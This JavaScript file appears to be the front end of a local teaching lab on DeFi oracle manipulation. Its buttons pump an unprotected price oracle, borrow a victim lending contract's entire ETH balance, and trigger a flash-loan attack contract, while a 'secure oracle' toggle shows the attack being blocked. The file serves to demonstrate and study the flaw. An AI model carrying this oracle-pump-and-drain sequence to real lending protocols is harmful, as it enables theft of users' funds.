// --- PASTE YOUR NEW LOCALHOST ADDRESSES HERE ---
const VULNERABLE_ORACLE_ADDRESS = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
const SECURE_ORACLE_ADDRESS = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";
const VICTIM_CONTRACT_ADDRESS = "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0";
const ATTACKER_CONTRACT_ADDRESS = "0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9";

// --- GLOBAL STATE ---
let provider, signer, currentAccount;
let isSecureChain = false;
let activeOracle, activeVictim, activeAttacker;

// --- ABI (The Interface) ---
const oracleAbi = [
  "function setPrice(uint256 _price) public",
  "function getPrice() public view returns (uint256)",
  "function owner() public view returns (address)"
];

const victimAbi = [
  "function depositCollateral() public",
  "function borrowETH(uint256 amount) public",
  "function setCollateralFactor(uint256 _factor) public",
  "function collateralFactor() public view returns (uint256)",
  "function collateralBalance(address) public view returns (uint256)"
];

const attackerAbi = [
  "function flashAttack() public"
];

// --- CORE FUNCTIONS ---
function setChain(secure) {
    isSecureChain = secure;
    activeOracle = secure ? SECURE_ORACLE_ADDRESS : VULNERABLE_ORACLE_ADDRESS;
    activeVictim = VICTIM_CONTRACT_ADDRESS;
    activeAttacker = ATTACKER_CONTRACT_ADDRESS;

    // Update UI Text
    document.getElementById("chainStatus").innerText = secure ? "Active: SECURE ORACLE" : "Active: VULNERABLE ORACLE";
    document.getElementById("chainStatus").style.color = secure ? "#4ade80" : "#fca5a5";
    refreshData();
}

async function connectWallet() {
    if (!window.ethereum) return alert("Install MetaMask!");
    provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    currentAccount = accounts[0];

    document.getElementById("connectBtn").innerText = "Connected: " + currentAccount.slice(0,6);
    setChain(false); // Start on Vulnerable Chain
}

// --- READ DATA ---
async function loadVictimETHBalance() {
    if (!provider) return;
    try {
        const balanceWei = await provider.getBalance(VICTIM_CONTRACT_ADDRESS);
        const balanceEth = ethers.formatEther(balanceWei);
        document.getElementById("victimEthBalance").innerText = parseFloat(balanceEth).toFixed(2) + " ETH";
    } catch (error) {
        console.error("Failed to load victim ETH balance:", error);
    }
}

async function refreshData() {
    if (!signer) return;
    const oracle = new ethers.Contract(activeOracle, oracleAbi, provider);
    const victim = new ethers.Contract(activeVictim, victimAbi, provider);

    await loadVictimETHBalance(); // Update Bank Balance

    // 1. Get Price
    const price = await oracle.getPrice();
    document.getElementById("oraclePrice").innerText = ethers.formatEther(price) + " ETH";

    // 2. Get Collateral Factor
    const factor = await victim.collateralFactor();
    document.getElementById("currentFactorDisplay").innerText = factor.toString() + "%";

    // 3. Get Your Collateral Balance
    const myCollat = await victim.collateralBalance(currentAccount);
    document.getElementById("userCollateral").innerText = myCollat.toString() + " Gold";
}

// --- WRITE FUNCTIONS ---

// 1. Fund the Bank
async function fundBank() {
    if (!signer) return alert("Please connect wallet first.");
    const amount = document.getElementById("depositEthInput").value;
    if (!amount) return alert("Enter an amount to fund.");

    try {
        const tx = await signer.sendTransaction({
            to: VICTIM_CONTRACT_ADDRESS,
            value: ethers.parseEther(amount)
        });
        await tx.wait();
        refreshData();
        alert("Bank successfully funded!");
    } catch (e) {
        console.error(e);
        alert("Funding failed. Check console.");
    }
}

// 2. Defender: Set the Safety Dial
async function updateSafetyDial() {
    const victim = new ethers.Contract(activeVictim, victimAbi, signer);
    const newFactor = document.getElementById("safetyDialInput").value;

    try {
        const tx = await victim.setCollateralFactor(newFactor);
        await tx.wait();
        alert("Safety Factor Updated!");
        refreshData();
    } catch (err) {
        console.error(err);
        alert("Update Failed (Are you the owner?)");
    }
}

// 3. User: Deposit Collateral
async function depositCollateral() {
    const victim = new ethers.Contract(activeVictim, victimAbi, signer);
    try {
        const tx = await victim.depositCollateral();
        await tx.wait();
        refreshData();
    } catch (err) { console.error(err); alert("Deposit Failed"); }
}

// 4. Attacker: Set Oracle Price
async function manipulateOracle() {
    const oracle = new ethers.Contract(activeOracle, oracleAbi, signer);
    const fakePrice = ethers.parseEther(document.getElementById("fakePriceInput").value);

    try {
        const tx = await oracle.setPrice(fakePrice);
        await tx.wait();
        refreshData();
        alert("Oracle Manipulated!");
    } catch (err) {
        if(isSecureChain) alert("BLOCKED: Only Owner can set price!");
        else console.error(err);
    }
}

// 5. Attacker: The Atomic Flash Loan
async function runFlashAttack() {
    const attacker = new ethers.Contract(activeAttacker, attackerAbi, signer);
    try {
        const tx = await attacker.flashAttack();
        await tx.wait();
        alert("BOOM! Flash Loan Attack Executed. Bank Drained.");
        refreshData();
    } catch (err) { console.error(err); alert("Attack Failed."); }
}

// --- NEW MANUAL LAB FUNCTIONS ---

// Step 2 Shortcut: Pump Price to 1000
async function manualPump() {
    document.getElementById("fakePriceInput").value = "1000";
    await manipulateOracle();
}

// Step 3 Logic: Drain Bank (Borrow Max)
async function manualDrain() {
    if (!signer) return alert("Connect Wallet!");
    const victim = new ethers.Contract(activeVictim, victimAbi, signer);

    // Check how much is in the bank
    const bankBalance = await provider.getBalance(VICTIM_CONTRACT_ADDRESS);
    const readableBalance = ethers.formatEther(bankBalance);

    if (parseFloat(readableBalance) === 0) return alert("Bank is already empty!");

    try {
        const tx = await victim.borrowETH(bankBalance);
        await tx.wait();
        refreshData();
        alert(`Successfully drained ${readableBalance} ETH!`);
    } catch (err) {
        console.error(err);
        alert("Drain Failed! (Did you deposit gold? Is the price pumped?)");
    }
}

// --- INIT ---
window.addEventListener("DOMContentLoaded", () => {
    document.getElementById("connectBtn").onclick = connectWallet;
    document.getElementById("depositBtn").onclick = depositCollateral;
    document.getElementById("updateFactorBtn").onclick = updateSafetyDial;
    document.getElementById("setPriceBtn").onclick = manipulateOracle;
    document.getElementById("attackBtn").onclick = runFlashAttack;
    document.getElementById("chainToggle").onclick = () => setChain(!isSecureChain);
    document.getElementById("fundBankBtn").onclick = fundBank;

    // NEW LISTENERS FOR MANUAL LAB
    document.getElementById("manualDepositBtn").onclick = depositCollateral;
    document.getElementById("manualManipulateBtn").onclick = manualPump;
    document.getElementById("manualBorrowBtn").onclick = manualDrain;
});